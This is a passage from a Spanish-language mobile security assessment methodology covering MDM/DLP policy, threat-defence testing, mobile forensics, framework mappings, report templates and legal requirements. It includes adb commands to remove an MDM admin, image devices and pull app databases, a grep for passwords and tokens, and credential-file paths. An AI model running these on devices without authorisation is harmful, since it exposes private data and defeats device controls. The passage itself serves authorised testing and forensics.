├── Configurar perfiles de VPN
├── Configurar certificados de autenticación
└── Configurar restricciones de copiar/pegar entre contenedores
```

#### 3. Protección de Datos (DLP)
```
Data Loss Prevention:
├── Deshabilitar copiar/pegar entre apps corporativas y personales: SÍ
├── Deshabilitar backup en la nube de datos corporativos: SÍ
├── Forzar cifrado de datos en tránsito: SÍ (TLS 1.2+)
├── Configurar contenedorización de datos corporativos: SÍ
├── Deshabilitar captura de pantalla en apps sensibles: SÍ
├── Deshabilitar impresión de documentos corporativos: SÍ
├── Control de apertura de documentos (Open In Management): SÍ
└── Deshabilitar sincronización de datos corporativos con servicios personales: SÍ
```

#### 4. Gestión de Red
```
Network Security:
├── Configurar VPN siempre activa (Always-On VPN): SÍ
├── Configurar Wi-Fi corporativo automáticamente: SÍ
├── Bloquear conexión a redes Wi-Fi abiertas: Configurar
├── Configurar proxy para tráfico corporativo: SÍ
├── Restringir uso de datos móviles para apps específicas: Configurar
└── Configurar DNS corporativo: SÍ
```

#### 5. Compliance y Monitoreo
```
Compliance Policies:
├── Verificar versión mínima del OS: Configurar
├── Verificar parches de seguridad: Últimos 90 días
├── Verificar estado de cifrado: SÍ
├── Verificar ausencia de root/jailbreak: SÍ
├── Verificar lista de apps instaladas: SÍ
├── Verificar estado de batería y almacenamiento: SÍ
├── Acción ante incumplimiento: Notificar → Restringir → Wipe
└── Reporte de compliance: Semanal
```

### Despliegue Microsoft Intune (Ejemplo)

```powershell
# === CONFIGURACIÓN INICIAL ===

# 1. Acceder a Microsoft Endpoint Manager admin center
# https://endpoint.microsoft.com

# 2. Configurar inscripción automática
# Azure AD > Mobility (MDM and MAM) > Microsoft Intune
# Configurar:
#   - MDM user scope: All / Some
#   - MAM user scope: All / Some
#   - MAM terms of use URL: [URL de términos]

# 3. Crear perfil de compliance (Android)
# Devices > Compliance policies > Create Policy > Android device owner
# Configurar:
#   - Require device to be at or under the machine risk level: Low
#   - Require the device to be at or under the device threat level: Low
#   - Require a password to unlock mobile devices: Required
#   - Minimum password length: 8
#   - Required password type: Alphanumeric
#   - Maximum minutes of inactivity before password is required: 2
#   - Maximum number of incorrect password attempts before device wipe: 10
#   - Security block jailbroken devices: Block
#   - Require encryption of data storage: Require
#   - Minimum OS version: 12.0

# 4. Crear perfil de compliance (iOS)
# Devices > Compliance policies > Create Policy > iOS
# Configurar:
#   - Require a password to unlock mobile devices: Required
#   - Minimum password length: 8
#   - Required password type: Alphanumeric
#   - Maximum minutes of inactivity before lock: 2
#   - Maximum number of incorrect password attempts before device wipe: 10
#   - Security block jailbroken devices: Block
#   - Minimum OS version: 16.0

# 5. Crear perfil de configuración (Android - Wi-Fi)
# Devices > Configuration profiles > Create Profile > Android device owner > Wi-Fi
# Configurar:
#   - SSID: CorpWiFi
#   - Network connection: Enterprise
#   - EAP type: EAP-TLS
#   - Identity certificate: [Certificado de identidad]
#   - Root certificate: [Certificado raíz]

# 6. Crear perfil de configuración (iOS - VPN)
# Devices > Configuration profiles > Create Profile > iOS > VPN
# Configurar:
#   - Connection name: CorpVPN
#   - VPN type: IKEv2
#   - Server: vpn.target.com
#   - Authentication method: Certificate
#   - On-demand rules: Connect on corporate Wi-Fi

# 7. Crear app protection policy (MAM)
# Apps > App protection policies > Create Policy
# Configurar:
#   - Data transfer: Prevent backups, restrict cut/copy/paste
#   - Encryption: Require app encryption
#   - Access: Require PIN for access
#   - Conditional launch: Min OS version, Max device threat level

# 8. Asignar políticas a grupos
# Asignar cada política al grupo de usuarios/dispositivos correspondiente
```

### Despliegue Jamf Pro (Entornos Apple)

```bash
# === CONFIGURACIÓN JAMF PRO ===

# 1. Configurar Apple Business Manager (ABM)
# https://business.apple.com
# - Agregar servidor MDM (Jamf Pro)
# - Asignar dispositivos al servidor MDM
# - Configurar DEP (Device Enrollment Program)

# 2. Configurar APNs (Apple Push Notification service)
# En Jamf Pro > Global Management > Apple Push Certificates
# - Crear solicitud de certificado
# - Descargar e instalar en Apple Push Certificates Portal

# 3. Crear PreStage Enrollment
# En Jamf Pro > Devices > PreStage Enrollments
# - Configurar:
#   - Nombre: "Corporate iOS Enrollment"
#   - Modo: Automated Device Enrollment
#   - Configuración de Setup Assistant: Omitir pasos innecesarios
#   - Require MDM enrollment: Yes

# 4. Crear Configuration Profiles
# En Jamf Pro > Computers > Configuration Profiles (o Devices para iOS)
# Ejemplos de perfiles:
#   - Restricciones: Deshabilitar AirDrop, iCloud, App Store
#   - Wi-Fi: Configurar red corporativa con WPA2-Enterprise
#   - VPN: Configurar VPN corporativa (IKEv2 o SSL)
#   - Certificados: Instalar certificados CA y de identidad
#   - Contraseña: Requerir PIN de 8+ caracteres

# 5. Crear Smart Groups para segmentación
# En Jamf Pro > Computers > Smart Computer Groups
# Ejemplos:
#   - "iOS Devices - Compliance Failed"
#   - "iOS Devices - OS Outdated"
#   - "iOS Devices - Jailbroken"

# 6. Configurar App Distribution
# En Jamf Pro > Mobile Devices > Apps
# - Agregar apps del App Store (VPP - Volume Purchase Program)
# - Agregar apps corporativas (IPA firmado internamente)
# - Configurar app configuration (preferencias automáticas)

# 7. Configurar Automated Device Enrollment
# Los dispositivos asignados en ABM se inscriben automáticamente
# al ser activados por primera vez (o después de wipe)
```

### Auditoría de Configuración MDM

```bash
# === VERIFICACIÓN DE POLÍTICAS MDM ===

# Android: Verificar estado de administración
adb shell dpm list-owners
adb shell dumpsys device_policy

# Verificar apps con permisos de administrador
adb shell pm list packages -U | while read line; do
    pkg=$(echo "$line" | cut -d: -f2)
    adb shell dumpsys package "$pkg" | grep -q "Device Admin" && echo "$pkg"
done

# iOS: Verificar perfiles MDM instalados
# Settings > General > VPN & Device Management
# Con libimobiledevice:
ideviceprovision list

# Verificar configuración de restricciones (iOS)
# En dispositivo: Settings > Screen Time > Content & Privacy Restrictions

# === TESTING DE BYPASS MDM ===

# Android: Intentar desactivar admin de dispositivo
adb shell dpm remove-active-admin com.mdm.agent/.DeviceAdminReceiver

# Android: Factory reset (verificar si FRP está activo)
# Si FRP (Factory Reset Protection) está activo, requiere credenciales

# iOS: Verificar si el perfil MDM puede ser removido
# Settings > General > VPN & Device Management > MDM Profile > Remove
# Si está configurado como "no removible", no se puede eliminar sin wipe

# === VERIFICACIÓN DE CONTENEDORIZACIÓN ===

# Android Enterprise: Verificar perfil de trabajo
adb shell pm list users
# Debería mostrar un "Work Profile" separado

# Verificar apps en perfil de trabajo
adb shell pm list packages --user 10  # User 10 = Work Profile

# iOS: Verificar Managed Apps vs Personal Apps
# Las apps gestionadas por MDM tienen un indicador visual
```

---

## Mobile Threat Defense (MTD)

### Capacidades MTD

```
┌─────────────────────────────────────────────────────────┐
│                 Mobile Threat Defense                     │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │  Device      │  │  Network    │  │  Application    │  │
│  │  Risk        │  │  Threats    │  │  Threats        │  │
│  │  Assessment  │  │  Detection  │  │  Detection      │  │
│  ├─────────────┤  ├─────────────┤  ├─────────────────┤  │
│  │• Root/JB    │  │• Evil Twin  │  │• Malicious apps │  │
│  │• OS version │  │• MITM       │  │• Repackaged apps│  │
│  │• Encryption │  │• SSL strip  │  │• Side-loaded    │  │
│  │• USB debug  │  │• DNS hijack │  │• Known vulns    │  │
│  │• Screen lock│  │• Rogue AP   │  │• Behavioral     │  │
│  └─────────────┘  └─────────────┘  └─────────────────┘  │
│                                                           │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │  Phishing   │  │  Data       │  │  Compliance     │  │
│  │  Protection │  │  Leakage    │  │  Monitoring     │  │
│  ├─────────────┤  ├─────────────┤  ├─────────────────┤  │
│  │• SMS phish  │  │• Clipboard  │  │• Policy enforce │  │
│  │• URL filter │  │• Screenshot │  │• Risk scoring   │  │
│  │• App phish  │  │• Cloud sync │  │• Reporting      │  │
│  │• QR code    │  │• Airdrop    │  │• Alerting       │  │
│  └─────────────┘  └─────────────┘  └─────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Soluciones MTD Recomendadas

| Solución | Fortalezas | Plataformas | Integración |
|----------|-----------|-------------|-------------|
| **CrowdStrike Falcon for Mobile** | Threat intelligence, EDR integration | Android, iOS | CrowdStrike Falcon platform |
| **Lookout Mobile Security** | Phishing protection, app analysis | Android, iOS | SIEM, MDM integration |
| **Zimperium zIPS** | On-device ML, zero-day detection | Android, iOS | SIEM, SOAR, MDM |
| **Microsoft Defender for Endpoint** | Microsoft 365 integration, ATP | Android, iOS | Microsoft 365 Defender |
| **Check Point Harmony Mobile** | Network security, sandboxing | Android, iOS | Check Point Security Gateway |
| **Pradeo Mobile Threat Defense** | Behavioral analysis, app reputation | Android, iOS | MDM/EMM integration |

### Evaluación de Soluciones MTD

```bash
# === CRITERIOS DE EVALUACIÓN MTD ===

# 1. Capacidades de Detección
#    - Detección de root/jailbreak: ¿Detecta Magisk, checkra1n, Dopamine?
#    - Detección de redes maliciosas: ¿Detecta evil twin, SSL stripping?
#    - Detección de apps maliciosas: ¿Analiza comportamiento, no solo firma?
#    - Detección de phishing: ¿Funciona en SMS, email, apps de mensajería?
#    - Detección de MITM: ¿Detecta certificate manipulation?

# 2. Modelo de Deployment
#    - On-device vs Cloud-based detection
#    - Impacto en batería y rendimiento
#    - Funcionamiento offline
#    - Tamaño del agente (footprint)

# 3. Integración
#    - MDM/EMM integration (Intune, Workspace ONE, Jamf)
#    - SIEM integration (Splunk, QRadar, Sentinel)
#    - SOAR integration (automated response)
#    - API availability

# 4. Compliance y Reporting
#    - Dashboards de riesgo
#    - Alertas configurables
#    - Reportes de compliance
#    - Integración con frameworks (NIST, ISO 27001)

# === TESTING DE EFECTIVIDAD MTD ===

# Test 1: Root/Jailbreak Detection
# - Instalar Magisk (Android) o checkra1n (iOS)
# - Verificar si el MTD detecta el compromiso
# - Tiempo de detección

# Test 2: Network Threat Detection
# - Configurar evil twin AP con hostapd
# - Verificar si el MTD alerta al usuario
# - Probar SSL stripping con mitmproxy

# Test 3: Malicious App Detection
# - Instalar app con comportamiento sospechoso
# - Verificar si el MTD la detecta
# - Probar con app repackeada

# Test 4: Phishing Detection
# - Enviar SMS con URL de phishing
# - Verificar si el MTD bloquea/alerta
# - Probar en diferentes apps de mensajería

# === CONFIGURACIÓN DE POLÍTICAS MTD (Ejemplo: Zimperium) ===

# 1. Risk Scoring Configuration
#    - Device risk weight: 40%
#    - Network risk weight: 30%
#    - Application risk weight: 20%
#    - Web/Phishing risk weight: 10%

# 2. Threat Response Actions
#    - Critical threat: Block access + Alert admin + Notify user
#    - High threat: Alert admin + Notify user + Restrict access
#    - Medium threat: Notify user + Log event
#    - Low threat: Log event only

# 3. Network Protection
#    - Enable evil twin detection: YES
#    - Enable MITM detection: YES
#    - Enable SSL stripping detection: YES
#    - Block known malicious IPs/domains: YES
#    - Alert on new/untrusted Wi-Fi: YES

# 4. Device Protection
#    - Block rooted/jailbroken devices: YES
#    - Require minimum OS version: YES
#    - Require encryption: YES
#    - Block devices with USB debugging: YES
#    - Alert on configuration changes: YES
```

---

## Mobile Device Forensics

### Metodología Forense Móvil

```
┌─────────────────────────────────────────────────────────┐
│              Mobile Forensics Process                     │
│              (NIST SP 800-101 Rev. 1)                    │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  1. PRESERVACIÓN          2. ADQUISICIÓN                │
│  ├─ Asegurar dispositivo   ├─ Physical acquisition       │
│  ├─ Modo avión             ├─ Logical acquisition        │
│  ├─ Bloquear pantalla      ├─ File system acquisition    │
│  ├─ Documentar estado      ├─ Cloud acquisition          │
│  └─ Fotografiar            └─ Chip-off / JTAG            │
│                                                           │
│  3. EXAMINACIÓN            4. ANÁLISIS                   │
│  ├─ Verificar integridad   ├─ Timeline analysis          │
│  ├─ Identificar datos      ├─ Link analysis              │
│  ├─ Extraer artifacts      ├─ Pattern analysis           │
│  └─ Decrypt si es posible  └─ Correlation               │
│                                                           │
│  5. REPORTE                                                   │
│  ├─ Chain of custody                                        │
│  ├─ Findings documentation                                  │
│  ├─ Evidence presentation                                   │
│  └─ Expert testimony (si aplica)                            │
└─────────────────────────────────────────────────────────┘
```

### Android Forensics

```bash
# === ADQUISICIÓN LÓGICA ===

# Extraer datos via ADB (requiere USB debugging habilitado)
adb backup -apk -shared -all -f backup.ab
# Convertir backup a tar
java -jar abe.jar unpack backup.ab backup.tar

# Extraer datos de apps específicas
adb shell pm list packages -f | grep target
adb pull /data/data/com.target.app/ ./forensics/com.target.app/

# Extraer base de datos SQLite
adb pull /data/data/com.target.app/databases/app.db ./forensics/
sqlite3 app.db ".dump" > app_dump.sql

# === ADQUISICIÓN FÍSICA (requiere root o custom recovery) ===

# Creación de imagen física con dd
adb shell "dd if=/dev/block/mmcblk0 of=/sdcard/forensic.img bs=4096"
adb pull /sdcard/forensic.img ./forensics/

# Alternativa: usar nanddump para NAND flash
adb shell "nanddump -f /sdcard/nanddump.img /dev/mtd/mtd0"

# Con TWRP recovery
# Bootear en TWRP > Advanced > Terminal
# dd if=/dev/block/bootdevice/by-name/userdata of=/sdcard/image.img

# === ANÁLISIS DE EVIDENCIA ===

# Analizar imagen con Autopsy/Sleuth Kit
autopsy --case android_case --evidence ./forensics/forensic.img

# Análisis de base de datos
sqlite3 app.db
sqlite> .tables
sqlite> SELECT * FROM messages;
sqlite> SELECT * FROM sessions;
sqlite> SELECT * FROM users;

# Análisis de SharedPreferences
cat com.target.app/shared_prefs/app_prefs.xml

# Análisis de logs
adb logcat -d -b all > device_logcat.txt
adb shell dmesg > kernel_log.txt

# Recuperación de datos borrados
# SQLite: los registros borrados pueden recuperarse del archivo .db
sqlite3 app.db "PRAGMA integrity_check;"
# Buscar en el archivo raw con strings
strings app.db | grep -iE "password|token|secret|deleted"

# === ARTIFACTOS ANDROID IMPORTANTES ===

# Ubicaciones de evidencia:
# /data/data/<package>/databases/    — Bases de datos SQLite
# /data/data/<package>/shared_prefs/ — Preferencias (XML)
# /data/data/<package>/files/        — Archivos de la app
# /data/data/<package>/cache/        — Caché
# /data/anr/traces.txt               — Crash traces
# /data/system/                      — System logs
# /data/system/packages.xml          — Lista de apps instaladas
# /data/system/accounts.db           — Cuentas del dispositivo
# /data/system/users/0/settings_*    — Configuraciones del usuario
# /sdcard/                           — Almacenamiento externo
# /data/misc/wifi/wpa_supplicant.conf — Redes WiFi guardadas
# /data/data/com.android.providers.telephony/mmssms.db — SMS/MMS
# /data/data/com.android.providers.contacts/contacts2.db — Contactos
# /data/data/com.android.browser/databases/browser2.db — Historial web
```

### iOS Forensics

```bash
# === ADQUISICIÓN LÓGICA ===

# Backup cifrado con iTunes/Finder (recomendado)
# - Conectar dispositivo a Mac/PC
# - En iTunes/Finder: marcar "Encrypt local backup"
# - Establecer contraseña de backup
# - Realizar backup

# Extraer backup con libimobiledevice
idevicebackup2 backup --full /path/to/backup/

# Analizar backup con iLEAPP o iBackup Viewer
python3 ileapp.py -t itunes -i /path/to/backup/ -o ./forensics/

# === ADQUISICIÓN DE FILE SYSTEM (dispositivo jailbroken) ===
idevicebackup2 backup --full /path/to/backup/

# Con SSH sobre USB (requiere jailbrewk + usbmuxd)
iproxy 2222 22
ssh root@localhost -p 2222
# Navegar y extraer archivos relevantes

# === ADQUISICIÓN FÍSICA (métodos avanzados) ===
# Checkm8 exploit (dispositivos A5-A11)
# - Usar checkra1n + SSH ramdisk
# - Crear imagen física del dispositivo

# === ANÁLISIS DE EVIDENCIA iOS ===

# Analizar con iLEAPP (iOS Logs, Events, And Plists Parser)
python3 ileapp.py -t fs -i /path/to/extracted/ -o ./forensics/

# Analizar con APOLLO (APple Parser Of LOgs)
python3 apollo.py -i /path/to/backup/ -o ./forensics/

# Analizar plist files
find /path/to/backup/ -name "*.plist" -exec plutil -p {} \;

# Analizar Keychain (si se tiene la contraseña)
# Usar keychain_tool o dumpdecrypted

# === ARTIFACTOS iOS IMPORTANTES ===

# Ubicaciones de evidencia:
# /var/mobile/Library/SMS/sms.db          — Mensajes SMS/iMessage
# /var/mobile/Library/AddressBook/AddressBook.sqlitedb — Contactos
# /var/mobile/Library/CallHistoryDB/CallHistory.storedata — Llamadas
# /var/mobile/Library/Safari/             — Historial y bookmarks de Safari
# /var/mobile/Library/Cookies/            — Cookies de Safari
# /var/mobile/Library/Preferences/        — Preferencias de apps (plist)
# /var/mobile/Library/Caches/             — Caché de apps
# /var/mobile/Media/                      — Fotos, videos, audio
# /var/mobile/Library/Voicemail/          — Mensajes de voz
# /var/mobile/Library/Notes/notes.sqlite  — Notas
# /var/mobile/Library/Calendar/Calendar.sqlitedb — Calendario
# /var/Keychains/                         — Keychain database
# /var/root/Library/Lockdown/             — Certificados de pairing
# /var/log/                               — System logs
# /var/db/                                — System databases
```

### Herramientas Forenses

| Herramienta | Tipo | Plataformas | Uso Principal |
|-------------|------|-------------|---------------|
| **Cellebrite UFED** | Comercial | Android, iOS | Adquisición física/lógica completa |
| **Magnet AXIOM** | Comercial | Android, iOS, Cloud | Análisis forense integral |
| **MSAB XRY** | Comercial | Android, iOS | Adquisición y análisis |
| **Oxygen Forensic Detective** | Comercial | Android, iOS, Cloud | Análisis avanzado |
| **Autopsy / Sleuth Kit** | Open Source | Android (imágenes) | Análisis de imágenes forenses |
| **iLEAPP** | Open Source | iOS | Análisis de backups iOS |
| **APOLLO** | Open Source | iOS | Análisis de logs iOS |
| **AFLogical** | Open Source | Android | Adquisición lógica |
| **Santoku Linux** | Distro | Android, iOS | Distro forense móvil |
| **Mobiledit Forensic** | Comercial | Android, iOS | Adquisición y análisis |

### Chain of Custody (Cadena de Custodia)

```
Formato de Cadena de Custodia — BRIDA IT Services
=================================================

Caso: [Número de caso]
Fecha: [DD/MM/AAAA]
Analista: [Nombre del analista]
Cliente: [Nombre del cliente]

EVIDENCIA:
┌────┬──────────┬────────────────┬────────────┬──────────────┬────────────┐
│ #  │ Fecha/Hora│ Descripción   │ Dispositivo│ De           │ A          │
├────┼──────────┼────────────────┼────────────┼──────────────┼────────────┤
│ 001│ DD/MM/YYYY│ iPhone 14 Pro │ SN: XXX    │ Cliente      │ Analista   │
│    │ HH:MM    │ iOS 17.2       │ IMEI: XXX  │              │ BRIDA      │
├────┼──────────┼────────────────┼────────────┼──────────────┼────────────┤
│ 002│ DD/MM/YYYY│ Imagen física │ Hash SHA256│ Analista     │ Evidencia  │
│    │ HH:MM    │ forensic.img   │ [hash]     │ BRIDA        │ almacenada │
├────┼──────────┼────────────────┼────────────┼──────────────┼────────────┤
│ 003│ DD/MM/YYYY│ Backup lógico  │ Hash SHA256│ Analista     │ Evidencia  │
│    │ HH:MM    │ backup.ab      │ [hash]     │ BRIDA        │ almacenada │
└────┴──────────┴────────────────┴────────────┴──────────────┴────────────┘

HASH DE INTEGRIDAD:
- Imagen original: SHA256: [hash]
- Copia de trabajo: SHA256: [hash]
- Verificación: [ ] Coincide  [ ] No coincide

ALMACENAMIENTO:
- Ubicación: [Caja fuerte / Disco cifrado]
- Acceso restringido: SÍ
- Cifrado: AES-256
```

---

## Mapeo a Frameworks

### MITRE ATT&CK Mobile — Mapeo Detallado

| Técnica ATT&CK | ID | Descripción | Test MASTG | D3FEND |
|----------------|-----|-------------|------------|--------|
| Gather Victim Host Info | T1592 | Fingerprinting del dispositivo | MASTG-TEST-0001 | D3-HS |
| Masquerade as Legitimate App | T1444 | App maliciosa que se hace pasar por legítima | MASTG-TEST-0005 | D3-SAV |
| Stored Data Manipulation | T1409 | Manipulación de datos almacenados | MASTG-TEST-0024 | D3-DEN |
| Credential Storage Exploitation | T1414 | Explotación de Keychain/Keystore | MASTG-TEST-0027 | D3-CA |
| Keylogger | T1417 | Captura de input del usuario | MASTG-TEST-0011 | D3-ISVA |
| SMS Messages | T1412 | Acceso a mensajes SMS | MASTG-TEST-0017 | D3-DL |
| Location Tracking | T1430 | Rastreo de ubicación del dispositivo | MASTG-TEST-0017 | D3-PLA |
| Adversary-in-the-Middle | T1557 | Interceptación de tráfico móvil | MASTG-TEST-0012 | D3-NTA |
| Code Snippet Obfuscation | T1540 | Ofuscación para evadir análisis | MASTG-TEST-0018 | D3-SAV |
| Virtualization Evasion | T1633 | Evasión de sandbox/detección | MASTG-TEST-0019 | D3-PLA |
| Repackaged Application | T1660 | Reempaquetado de app legítima | MASTG-TEST-0005 | D3-SAV |
| Protected User Data | T1636 | Acceso a datos protegidos del usuario | MASTG-TEST-0027 | D3-DL |

### NIST CSF 2.0 — Mapeo por Función

| Función | Categoría | Controles Móviles |
|---------|-----------|-------------------|
| **GOVERN** | Organizational Context | Política de seguridad móvil, BYOD policy |
| **GOVERN** | Risk Management Strategy | Evaluación de riesgo móvil, threat modeling |
| **GOVERN** | Supply Chain Risk Management | Auditoría de SDKs de terceros |
| **IDENTIFY** | Asset Management | Inventario de dispositivos y apps móviles |
| **IDENTIFY** | Risk Assessment | Evaluación de vulnerabilidades en apps móviles |
| **PROTECT** | Identity Management | Autenticación móvil (MFA, biometría) |
| **PROTECT** | Data Security | Cifrado de datos móviles (at-rest, in-transit) |
| **PROTECT** | Platform Security | Hardening de dispositivos Android/iOS |
| **PROTECT** | Technology Infrastructure Resilience | MDM/EMM, MTD deployment |
| **DETECT** | Continuous Monitoring | Monitoreo de amenazas móviles (MTD) |
| **DETECT** | Adverse Event Analysis | Análisis de incidentes móviles |
| **RESPOND** | Incident Management | Respuesta a incidentes móviles, remote wipe |
| **RESPOND** | Incident Analysis | Forensía móvil, análisis de evidencia |
| **RECOVER** | Incident Recovery | Restauración de dispositivos, recuperación de datos |

### D3FEND — Mapeo de Contramedidas

| Contramedida D3FEND | Técnica | Aplicación Móvil |
|---------------------|---------|------------------|
| D3-MFA | Multi-factor Authentication | Biometría + PIN en apps móviles |
| D3-EDR | Endpoint Detection and Response | MTD agents en dispositivos móviles |
| D3-SAV | Software Attribute Verification | Verificación de firma de apps |
| D3-FR | Firmware Revision Verification | Verificación de versión del OS |
| D3-PLA | Platform Monitoring | Monitoreo de compliance de dispositivos |
| D3-CE | Configuration Enforcement | Políticas MDM/EMM |
| D3-DEN | Data Encryption | Cifrado de dispositivo y datos |
| D3-DL | Data Loss Prevention | Políticas DLP en MDM |
| D3-NTA | Network Traffic Analysis | Análisis de tráfico móvil |
| D3-CB | Certificate-based Authentication | Certificate pinning en apps |
| D3-EAL | Execution Allowlisting | Whitelist de apps en MDM |
| D3-DA | Dynamic Analysis | Análisis dinámico de apps (MASTG) |
| D3-ISVA | Input Source Validation Analysis | Validación de input en apps |

---

## Entregables

### 1. Executive Summary
```
Resumen Ejecutivo — Mobile Security Assessment
==============================================

Cliente: [Nombre del cliente]
Fecha: [DD/MM/AAAA]
Consultor: [Nombre del consultor BRIDA]
Clasificación: CONFIDENCIAL

HALLAZGOS PRINCIPALES:
- Total de hallazgos: [N]
- Críticos: [N]
- Altos: [N]
- Medios: [N]
- Bajos: [N]
- Informativos: [N]

RIESGO GENERAL: [CRÍTICO / ALTO / MEDIO / BAJO]

RESUMEN EJECUTIVO:
[Descripción de 2-3 párrafos del estado general de seguridad
de la aplicación móvil, los principales riesgos identificados
y el impacto potencial para el negocio]

RECOMENDACIONES PRIORITARIAS:
1. [Recomendación de mayor prioridad]
2. [Segunda recomendación]
3. [Tercera recomendación]
```

### 2. Technical Findings Template
```
Hallazgo Técnico #[N]
====================

Título: [Descripción corta del hallazgo]
Severidad: [Crítico / Alto / Medio / Bajo / Informativo]
CVSS v3.1: [Score] ([Vector])
CWE: CWE-[N] — [Nombre]
OWASP Mobile Top 10: M[N] — [Nombre]
MASTG Test ID: MASTG-TEST-[NNNN]
MITRE ATT&CK: T[NNNN] — [Nombre de la técnica]
NIST CSF: [Función] - [Categoría]
D3FEND: D3-[XXX] — [Contramedida recomendada]

DESCRIPCIÓN:
[Descripción detallada de la vulnerabilidad, incluyendo
el contexto técnico y cómo fue identificada]

EVIDENCIA:
- Screenshot #[N]: [Descripción de la captura]
- Request/Response: [Fragmento del tráfico interceptado]
- Código afectado: [Fragmento de código relevante]
- Ubicación: [Archivo/función donde se encuentra]

IMPACTO:
[Descripción del impacto potencial en la confidencialidad,
integridad y disponibilidad de los datos y sistemas]

REPRODUCCIÓN:
1. [Paso 1 para reproducir]
2. [Paso 2 para reproducir]
3. [Paso 3 para reproducir]

REMEDIACIÓN:
[Guía detallada de cómo corregir la vulnerabilidad,
incluyendo código de ejemplo si aplica]

REFERENCIAS:
- [Enlace a documentación relevante]
- [Enlace a CWE/CVE]
- [Enlace a OWASP MASTG]
```

### 3. Risk Matrix
```
Matriz de Riesgos — Mobile Security Assessment
==============================================

              │ Impacto Bajo │ Impacto Medio │ Impacto Alto │ Impacto Crítico
──────────────┼──────────────┼───────────────┼──────────────┼────────────────
Prob. Alta    │    MEDIO     │     ALTO      │   CRÍTICO    │    CRÍTICO
Prob. Media   │    BAJO      │     MEDIO     │    ALTO      │    CRÍTICO
Prob. Baja    │    BAJO      │     BAJO      │    MEDIO     │    ALTO
Prob. Muy Baja│ INFORMATIVO  │     BAJO      │    BAJO      │    MEDIO

HALLAGOS POR SEVERIDAD:
┌─────────────┬───────┬──────────────────────────────────────────┐
│ Severidad   │ Count │ Hallazgos                                │
├─────────────┼───────┼──────────────────────────────────────────┤
│ Crítico     │   N   │ [Lista de hallazgos críticos]            │
│ Alto        │   N   │ [Lista de hallazgos altos]               │
│ Medio       │   N   │ [Lista de hallazgos medios]              │
│ Bajo        │   N   │ [Lista de hallazgos bajos]               │
│ Informativo │   N   │ [Lista de hallazgos informativos]        │
└─────────────┴───────┴──────────────────────────────────────────┘
```

### 4. MDM Policy Recommendations
```
Recomendaciones de Políticas MDM
==================================

Basado en los hallazgos del assessment, se recomiendan
las siguientes políticas MDM para mitigar los riesgos
identificados:

1. [Política 1]
   - Justificación: [Hallazgo relacionado]
   - Configuración: [Configuración específica]
   - Prioridad: [Alta/Media/Baja]

2. [Política 2]
   - Justificación: [Hallazgo relacionado]
   - Configuración: [Configuración específica]
   - Prioridad: [Alta/Media/Baja]

[... más políticas ...]
```

### 5. Remediation Plan
```
Plan de Remediación Priorizado
===============================

FASE 1 — Inmediato (0-30 días):
- [ ] [Hallazgo crítico 1] — [Acción de remediación]
- [ ] [Hallazgo crítico 2] — [Acción de remediación]

FASE 2 — Corto plazo (30-60 días):
- [ ] [Hallazgo alto 1] — [Acción de remediación]
- [ ] [Hallazgo alto 2] — [Acción de remediación]

FASE 3 — Mediano plazo (60-90 días):
- [ ] [Hallazgo medio 1] — [Acción de remediación]
- [ ] [Hallazgo medio 2] — [Acción de remediación]

FASE 4 — Largo plazo (90+ días):
- [ ] [Hallazgo bajo 1] — [Acción de remediación]
- [ ] [Mejora de seguridad 1] — [Acción]
```

---

## Checklist Pre-Engagement

### Antes de Iniciar el Assessment

```
PRE-ENGAGEMENT CHECKLIST — Mobile Security
===========================================

AUTORIZACIÓN Y LEGAL:
[ ] Scope of Work (SOW) firmado por el cliente
[ ] NDA mutuo firmado
[ ] Reglas de Engagement (RoE) documentadas y aprobadas
[ ] Ventana de testing acordada
[ ] Contacto de emergencia del cliente identificado
[ ] Seguro de responsabilidad civil vigente
[ ] Protocolo de manejo de datos sensibles definido

INFORMACIÓN TÉCNICA:
[ ] Binarios de la app recibidos (APK/AAB o IPA)
[ ] Credenciales de prueba proporcionadas
[ ] Documentación de arquitectura de la app
[ ] Lista de endpoints de API
[ ] Flujos de autenticación documentados
[ ] Cuentas de usuario de prueba (diferentes roles)
[ ] Acceso a entorno de staging (si aplica)

ENTORNO DE TRABAJO:
[ ] Kali Linux actualizado
[ ] Android SDK Platform Tools instalado
[ ] ADB configurado y funcionando
[ ] Burp Suite configurado con proxy
[ ] Certificado CA de Burp exportado
[ ] Frida instalado (versión compatible)
[ ] Objection instalado
[ ] JADX / apktool / dex2jar instalados
[ ] Dispositivo de prueba preparado (Android/iOS)
[ ] Emulador configurado (Android Studio / Genymotion)
[ ] Wireshark / tcpdump disponible
[ ] Herramientas forenses disponibles (si aplica)

DISPOSITIVOS DE PRUEBA:
[ ] Dispositivo Android físico (diferentes versiones de OS)
[ ] Dispositivo iOS físico (si aplica)
[ ] Emulador Android con Google Play Services
[ ] Dispositivo rooteado (para testing avanzado Android)
[ ] Dispositivo jailbroken (para testing avanzado iOS)
[ ] Tarjeta SIM de prueba (si aplica)

COMUNICACIÓN:
[ ] Canal seguro de comunicación establecido (Signal/email cifrado)
[ ] Repositorio de evidencias configurado (cifrado)
[ ] Plantillas de reporte preparadas
[ ] Formato de entregables acordado con el cliente
```

---

## Consideraciones Legales (México)

> ⚠️ **IMPORTANTE:** Esta sección es orientativa. BRIDA IT Services siempre trabaja con asesoría legal especializada.

### Marco Legal Aplicable

| Ley/Regulación | Artículo | Relevancia |
|----------------|----------|------------|
| **Código Penal Federal** | Art. 211 bis | Acceso ilícito a sistemas informáticos — Delito federal |
| **LFPDPPP** | Arts. 1-3 | Protección de datos personales en posesión de particulares |
| **Ley General de Protección de Datos Personales** | Arts. 1-99 | Datos en posesión de sujetos obligados |
| **CNBV Circular** | 14/2015 | Requisitos de seguridad para instituciones financieras |
| **Ley de Propiedad Industrial** | Arts. 213-213 bis | Protección de software y propiedad intelectual |
| **PCI-DSS** | Req. 6.5 | Seguridad en aplicaciones de pago |

### Requisitos para Testing Legal

1. **Autorización escrita obligatoria** del propietario del sistema/aplicación
2. **Alcance explícito** — qué sistemas, apps, dispositivos están en scope
3. **Ventana de testing** definida — fechas y horarios
4. **NDA firmado** — protección de información confidencial
5. **Protocolo de datos personales** — cómo manejar PII encontrada
6. **Reglas de Engagement** — qué técnicas están permitidas/prohibidas
7. **Contacto de emergencia** — para detener pruebas si es necesario

### Buenas Prácticas Legales BRIDA

